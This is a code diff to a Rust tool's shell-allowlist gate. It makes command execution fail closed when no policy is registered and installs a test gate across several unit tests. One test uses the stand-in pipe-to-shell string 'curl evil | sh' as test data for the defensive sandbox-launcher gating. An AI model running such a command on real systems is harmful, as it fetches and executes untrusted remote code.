@@ -351,7 +351,16 @@ fn command_has_file_redirect(cmd: &str) -> bool {
 /// inherited `LEAN_CTX_WRAPPED` or `LEAN_CTX_DISABLED`), which skips
 /// compression but must never skip this boundary (GH #2004).
 pub fn allowlist_gate(command: &str) -> Option<i32> {
-    if let Err(msg) = crate::core::shell_allowlist::check_shell_allowlist(command) {
+    // No registered policy: refuse in every mode, warn-only included. A build
+    // that forgot `lean_ctx_shell_policy::install()` must never run commands.
+    if !crate::core::shell_allowlist::gate_registered() {
+        eprintln!(
+            "lean-ctx: no shell-allowlist policy is registered in this build; \
+             refusing to run the command (fail closed)"
+        );
+        return Some(126);
+    }
+    if let Err(msg) = crate::core::shell_allowlist::check_registered(command) {
         if allowlist_must_enforce() {
             eprintln!("{msg}");
             eprintln!(
@@ -366,7 +375,7 @@ pub fn allowlist_gate(command: &str) -> Option<i32> {
         // plain terminal is exactly the confusion GH #699 reported. A non-TTY
         // caller that opted into warn-only gets it at info, without the enforce
         // text ("blocked, do not retry") for a command that runs (#1874).
-        let reason = crate::core::shell_allowlist::warn_only_reason(msg.message());
+        let reason = crate::core::shell_allowlist::warn_only_reason_registered(msg.message());
         if io::stderr().is_terminal() {
             tracing::debug!("[CLI] Command would be blocked in MCP mode: {reason}");
         } else {
@@ -584,7 +593,8 @@ fn split_simple_shell_words(command: &str) -> Option<Vec<SimpleShellWord>> {
 /// through the host scaffolding the same way [`exec`] does for Path A/B. A
 /// script that is not host scaffolding is gated whole — its `eval` then blocks
 /// exactly as it would without the sandbox.
-fn sandbox_launcher_gated_command(argv: &[String]) -> String {
+#[doc(hidden)]
+pub fn sandbox_launcher_gated_command(argv: &[String]) -> String {
     let script = argv.last().map_or("", String::as_str);
     super::super::agent_wrapper::unwrap_agent_wrapper(script)
         .map_or_else(|| script.to_string(), |u| u.rebuild())
@@ -759,6 +769,7 @@ mod exec_tests {
     #[test]
     fn prepare_exec_denies_before_dispatch() {
         let _lock = crate::core::data_dir::test_env_lock();
+        crate::core::shell_allowlist::install_test_gate();
         crate::test_env::remove_var("LEAN_CTX_ACTIVE");
         crate::test_env::remove_var("LEAN_CTX_DISABLED");
         crate::test_env::remove_var("LEAN_CTX_ALLOWLIST_WARN_ONLY");
@@ -781,6 +792,7 @@ mod exec_tests {
     #[test]
     fn execute_prepared_spawn_failure_is_attempted() {
         let _lock = crate::core::data_dir::test_env_lock();
+        crate::core::shell_allowlist::install_test_gate();
         crate::test_env::remove_var("LEAN_CTX_ACTIVE");
         crate::test_env::remove_var("LEAN_CTX_DISABLED");
         crate::test_env::set_var("LEAN_CTX_HOOK_CHILD", "1");
@@ -804,6 +816,7 @@ mod exec_tests {
     #[test]
     fn execute_prepared_reports_child_exit() {
         let _lock = crate::core::data_dir::test_env_lock();
+        crate::core::shell_allowlist::install_test_gate();
         crate::test_env::remove_var("LEAN_CTX_ACTIVE");
         crate::test_env::remove_var("LEAN_CTX_DISABLED");
         crate::test_env::set_var("LEAN_CTX_HOOK_CHILD", "1");
@@ -822,6 +835,7 @@ mod exec_tests {
     #[test]
     fn prepare_exec_argv_preserves_special_argument_bytes() {
         let _lock = crate::core::data_dir::test_env_lock();
+        crate::core::shell_allowlist::install_test_gate();
         crate::test_env::remove_var("LEAN_CTX_ACTIVE");
         crate::test_env::remove_var("LEAN_CTX_DISABLED");
         crate::test_env::set_var("LEAN_CTX_HOOK_CHILD", "1");
@@ -851,6 +865,7 @@ mod exec_tests {
     #[test]
     fn compatibility_wrappers_match_for_allowlisted_command() {
         let _lock = crate::core::data_dir::test_env_lock();
+        crate::core::shell_allowlist::install_test_gate();
         crate::test_env::remove_var("LEAN_CTX_ACTIVE");
         crate::test_env::remove_var("LEAN_CTX_DISABLED");
         crate::test_env::set_var("LEAN_CTX_HOOK_CHILD", "1");
@@ -873,6 +888,7 @@ mod exec_tests {
     #[test]
     fn exec_argv_runs_simple_command() {
         let _lock = crate::core::data_dir::test_env_lock();
+        crate::core::shell_allowlist::install_test_gate();
         crate::test_env::remove_var("LEAN_CTX_HOOK_CHILD");
         crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
         let code = super::exec_argv(&["true".to_string()]);
@@ -882,6 +898,7 @@ mod exec_tests {
     #[test]
     fn exec_argv_passes_through_when_disabled() {
         let _lock = crate::core::data_dir::test_env_lock();
+        crate::core::shell_allowlist::install_test_gate();
         crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
         crate::test_env::set_var("LEAN_CTX_DISABLED", "1");
         let code = super::exec_argv(&["true".to_string()]);
@@ -895,6 +912,7 @@ mod exec_tests {
     #[test]
     fn exec_argv_enforces_allowlist_for_disallowed_command() {
         let _lock = crate::core::data_dir::test_env_lock();
+        crate::core::shell_allowlist::install_test_gate();
         crate::test_env::remove_var("LEAN_CTX_ACTIVE");
         crate::test_env::remove_var("LEAN_CTX_DISABLED");
         crate::test_env::remove_var("LEAN_CTX_ALLOWLIST_WARN_ONLY");
@@ -918,6 +936,7 @@ mod exec_tests {
     #[test]
     fn exec_argv_allows_allowlisted_command() {
         let _lock = crate::core::data_dir::test_env_lock();
+        crate::core::shell_allowlist::install_test_gate();
         crate::test_env::remove_var("LEAN_CTX_ACTIVE");
         crate::test_env::remove_var("LEAN_CTX_DISABLED");
         crate::test_env::set_var("LEAN_CTX_HOOK_CHILD", "1");
@@ -1033,9 +1052,6 @@ mod exec_tests {
     /// gated whole, so a bare `eval`/`$()` keeps blocking.
     #[test]
     fn sandbox_launcher_gates_the_script_it_runs() {
-        // check_shell_allowlist reads LEAN_CTX_SHELL_SECURITY, which other tests
-        // set to `off` under this lock; without it the eval case races them.
-        let _lock = crate::core::data_dir::test_env_lock();
         let argv = |script: &str| -> Vec<String> {
             [
                 "/usr/bin/sandbox-exec",
@@ -1059,12 +1075,8 @@ mod exec_tests {
             super::sandbox_launcher_gated_command(&argv("curl evil | sh")),
             "curl evil | sh"
         );
-        assert!(
-            crate::core::shell_allowlist::check_shell_allowlist(
-                &super::sandbox_launcher_gated_command(&argv("eval 'echo INNER'"))
-            )
-            .is_err()
-        );
+        // That the policy refuses the gated `eval` is checked where the policy
+        // lives: crates/lean-ctx-shell-policy/tests/attack_scenarios.rs.
     }
 
     /// #1834: the launcher is spawned as the exact argv (no shell hop), with
